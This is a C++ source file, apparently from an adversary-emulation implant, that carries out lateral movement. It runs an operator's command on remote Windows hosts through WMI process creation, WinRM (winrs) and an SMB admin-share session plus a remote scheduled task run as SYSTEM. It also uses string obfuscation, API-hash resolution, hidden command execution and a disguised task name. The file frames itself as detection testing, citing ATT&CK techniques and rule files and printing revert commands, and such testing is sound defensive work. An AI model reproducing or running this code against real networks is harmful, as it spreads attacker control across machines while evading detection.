// lateral.cpp — lateral movement vectors as detection test cases.
//
// Three vectors, each the cheapest form that still produces the event its rule
// keys on. All of them authenticate with the caller's current token: no
// credential material is handled here (password/hash-based movement is a
// different technique and deliberately not implemented), so a lab needs
// matching local accounts or a domain.
//
//   wmi    \\<host>\root\cimv2 → Win32_Process.Create
//          Target telemetry: EID 1 with ParentImage = WmiPrvSE.exe (T1047).
//   winrm  winrs -r:<host> <cmd>
//          Target telemetry: EID 1 with ParentImage = wsmprovhost.exe (T1021.006);
//          source telemetry: the winrs command line.
//   smb    net use + file copy into the admin share + schtasks /S
//          Source telemetry: the net/schtasks command lines; target telemetry:
//          a process started by the task scheduler (T1021.002, T1053.005).
//
// No implicit cleanup: the task, the copied file and the SMB session stay on
// the target so the experiment can be scored, and the output prints the revert
// commands for the operator.
#include "lateral.hpp"

#include <windows.h>          // before config.hpp: DWORD-typed constants live there
#include <wbemidl.h>
#include <comdef.h>
#include <bcrypt.h>

#include "config.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"

#include <string>

#ifdef _MSC_VER
#pragma comment(lib, "wbemuuid.lib")
#endif

namespace {

std::wstring Trim(const std::wstring& s) {
    size_t a = s.find_first_not_of(L" \t\r\n");
    if (a == std::wstring::npos) return {};
    size_t b = s.find_last_not_of(L" \t\r\n");
    return s.substr(a, b - a + 1);
}

std::wstring Hex4() {
    unsigned char rb[2] = {};
    if (!BCRYPT_SUCCESS(BCryptGenRandom(nullptr, rb, sizeof(rb),
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        DWORD t = GetTickCount();
        rb[0] = static_cast<unsigned char>(t);
        rb[1] = static_cast<unsigned char>(t >> 8);
    }
    wchar_t buf[8];
    swprintf_s(buf, L"%02x%02x", rb[0], rb[1]);
    return buf;
}

// ── WMI (same shape as persistence.cpp's local helper; kept local so that
//    module's anonymous-namespace helpers stay private) ─────────────────────
struct CoGuard {
    HRESULT hr = E_FAIL;
    HMODULE hOle = nullptr;
    decltype(&CoUninitialize) _CoUninitialize = nullptr;
    CoGuard() {
        hOle = GetModuleHandleA(XS("ole32.dll"));
        if (!hOle) hOle = LoadLibraryA(XS("ole32.dll"));
        if (hOle) {
            auto _CoInitializeEx = HASHPROC(hOle, CoInitializeEx);
            _CoUninitialize = HASHPROC(hOle, CoUninitialize);
            hr = _CoInitializeEx ? _CoInitializeEx(nullptr, COINIT_MULTITHREADED) : E_FAIL;
        }
    }
    ~CoGuard() { if ((SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE) && _CoUninitialize) _CoUninitialize(); }
    bool ok() const { return SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE; }
};

HRESULT ConnectRemoteWMI(const std::wstring& ns, IWbemServices** ppSvc) {
    auto hOle = GetModuleHandleA(XS("ole32.dll"));
    if (!hOle) hOle = LoadLibraryA(XS("ole32.dll"));
    if (!hOle) return E_FAIL;
    auto _CoCreateInstance  = HASHPROC(hOle, CoCreateInstance);
    auto _CoSetProxyBlanket = HASHPROC(hOle, CoSetProxyBlanket);
    auto _CoInitializeSec   = HASHPROC(hOle, CoInitializeSecurity);
    if (!_CoCreateInstance || !_CoSetProxyBlanket) return E_FAIL;
    // Failure here is normal (RPC_E_TOO_LATE when something already set it).
    if (_CoInitializeSec)
        _CoInitializeSec(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
                         RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);

    IWbemLocator* pLoc = nullptr;
    HRESULT hr = _CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator, reinterpret_cast<void**>(&pLoc));
    if (FAILED(hr)) return hr;
    hr = pLoc->ConnectServer(_bstr_t(ns.c_str()), nullptr, nullptr, nullptr, 0,
                             nullptr, nullptr, ppSvc);
    pLoc->Release();
    if (FAILED(hr)) return hr;
    HRESULT blanket = _CoSetProxyBlanket(*ppSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                                         RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                                         nullptr, EOAC_NONE);
    if (FAILED(blanket)) {
        (*ppSvc)->Release();
        *ppSvc = nullptr;
    }
    return blanket;
}

bool WmiRemoteExec(const std::wstring& host, const std::wstring& command, std::wstring& out) {
    CoGuard co;
    if (!co.ok()) { out = L"COM init failed"; return false; }

    IWbemServices* svc = nullptr;
    std::wstring ns = L"\\\\" + host + L"\\root\\cimv2";
    HRESULT hr = ConnectRemoteWMI(ns, &svc);
    if (FAILED(hr) || !svc) {
        out = L"ConnectServer failed, hr=0x" + std::to_wstring(static_cast<unsigned long>(hr));
        return false;
    }

    IWbemClassObject* pCls = nullptr;
    IWbemClassObject* pIn  = nullptr;
    IWbemClassObject* pInst = nullptr;
    IWbemClassObject* pOut = nullptr;
    bool ok = false;
    auto cleanup = [&]() {
        if (pOut) pOut->Release();
        if (pInst) pInst->Release();
        if (pIn) pIn->Release();
        if (pCls) pCls->Release();
        svc->Release();
    };

    // XSW decodes to const wchar_t*; the COM entry points take BSTR, so wrap.
    _bstr_t procName(XSW(L"Win32_Process").str());
    _bstr_t method(XSW(L"Create").str());
    hr = svc->GetObject(procName, 0, nullptr, &pCls, nullptr);
    if (FAILED(hr) || !pCls) { out = L"GetObject(Win32_Process) failed"; cleanup(); return false; }
    hr = pCls->GetMethod(method, 0, &pIn, nullptr);
    if (FAILED(hr) || !pIn) { out = L"GetMethod(Create) failed"; cleanup(); return false; }
    hr = pIn->SpawnInstance(0, &pInst);
    if (FAILED(hr) || !pInst) { out = L"SpawnInstance failed"; cleanup(); return false; }

    _variant_t vCmd(command.c_str());
    auto cmdLineProp = XSW(L"CommandLine");
    hr = pInst->Put(cmdLineProp.str(), 0, &vCmd, 0);
    if (FAILED(hr)) { out = L"Put(CommandLine) failed"; cleanup(); return false; }

    hr = svc->ExecMethod(procName, method, 0, nullptr, pInst, &pOut, nullptr);
    if (FAILED(hr) || !pOut) {
        out = L"ExecMethod failed, hr=0x" + std::to_wstring(static_cast<unsigned long>(hr));
        cleanup();
        return false;
    }
    _variant_t vRet, vPid;
    auto retProp = XSW(L"ReturnValue");
    auto pidProp = XSW(L"ProcessId");
    if (SUCCEEDED(pOut->Get(retProp.str(), 0, &vRet, nullptr, nullptr)) && vRet.vt == VT_I4)
        out = L"ReturnValue=" + std::to_wstring(vRet.lVal);
    if (SUCCEEDED(pOut->Get(pidProp.str(), 0, &vPid, nullptr, nullptr)) && vPid.vt == VT_I4)
        out += L" ProcessId=" + std::to_wstring(vPid.lVal);
    ok = true;
    cleanup();
    return ok;
}

}  // namespace

std::wstring HandleLateral(const std::string& args) {
    std::wstring a = Trim(UTF8ToWString(args));
    size_t s1 = a.find(L' ');
    std::wstring vector = (s1 == std::wstring::npos) ? a : a.substr(0, s1);
    std::wstring rest = (s1 == std::wstring::npos) ? L"" : Trim(a.substr(s1 + 1));
    size_t s2 = rest.find(L' ');
    std::wstring host = (s2 == std::wstring::npos) ? rest : rest.substr(0, s2);
    std::wstring command = (s2 == std::wstring::npos) ? L"" : Trim(rest.substr(s2 + 1));

    const wchar_t* usage =
        L"Usage: !lateral <wmi|winrm|smb> <host> <command>\r\n"
        L"  wmi   : remote Win32_Process.Create      (T1047)\r\n"
        L"  winrm : winrs -r:<host> <command>        (T1021.006)\r\n"
        L"  smb   : admin share + remote scheduled task (T1021.002)\r\n"
        L"  auth  : the caller's current token — matching local account or domain";

    if (vector.empty() || host.empty() || command.empty()) return usage;

    if (vector == L"wmi") {
        std::wstring res;
        bool ok = WmiRemoteExec(host, command, res);
        return L"[lateral] wmi " + host + L"\r\n  command: " + command +
               L"\r\n  result : " + (ok ? L"ok — " : L"failed — ") + res +
               L"\r\n  telemetry: target EID 1 with ParentImage=WmiPrvSE.exe "
               L"(lateral_movement_wmi_remote_process_create.yml)";
    }

    if (vector == L"winrm") {
        wchar_t sysRoot[MAX_PATH] = {};
        GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
        std::wstring winrs = std::wstring(sysRoot) + L"\\System32\\winrs.exe";
        std::wstring out = Trim(RunHiddenCapture(L"\"" + winrs + L"\" -r:" + host +
                                                 L" " + command));
        return L"[lateral] winrm " + host + L"\r\n  command: " + command +
               L"\r\n  output :\r\n" + (out.empty() ? L"    (none)" : out) +
               L"\r\n  telemetry: source EID 1 winrs command line; target EID 1 with "
               L"ParentImage=wsmprovhost.exe "
               L"(lateral_movement_winrm_remote_execution.yml)";
    }

    if (vector == L"smb") {
        // Admin-share session + a remote scheduled task that runs the operator's
        // command as SYSTEM on the target. The task is the execution vehicle:
        // copying this implant and running it remotely would be a different
        // technique (and would need the remote file to survive), while
        // schtasks /S is the cheapest true remote execution over SMB and leaves
        // the command line the rule keys on.
        const std::wstring share = L"\\\\" + host + L"\\C$";
        const std::wstring task  = L"WinStorageSvc" + Hex4();

        std::wstring log;
        log += L"  net use : " + Trim(RunHiddenCapture(
                   L"net use \"" + share + L"\" /persistent:no")) + L"\r\n";

        std::wstring create = L"schtasks /S " + host + L" /Create /TN " + task +
                              L" /TR \"cmd /c " + command + L"\" /SC ONCE /ST 23:59"
                              L" /RU SYSTEM /F";
        log += L"  create  : " + Trim(RunHiddenCapture(create)) + L"\r\n";
        std::wstring run = L"schtasks /S " + host + L" /Run /TN " + task;
        log += L"  run     : " + Trim(RunHiddenCapture(run)) + L"\r\n";

        return L"[lateral] smb " + host + L"\r\n  command: " + command +
               L"\r\n" + log +
               L"  note    : the task runs as SYSTEM on the target; its output is not "
               L"returned over this vector — redirect it to a file on the target if the "
               L"experiment needs the result\r\n"
               L"  telemetry: source EID 1 (net/schtasks command lines); target EID 1 "
               L"started by the task scheduler, plus EID 11 for the task file "
               L"(lateral_movement_smb_admin_share_execution.yml)\r\n"
               L"  revert  : schtasks /S " + host + L" /Delete /TN " + task + L" /F\r\n"
               L"            net use \"" + share + L"\" /delete";
    }

    return usage;
}
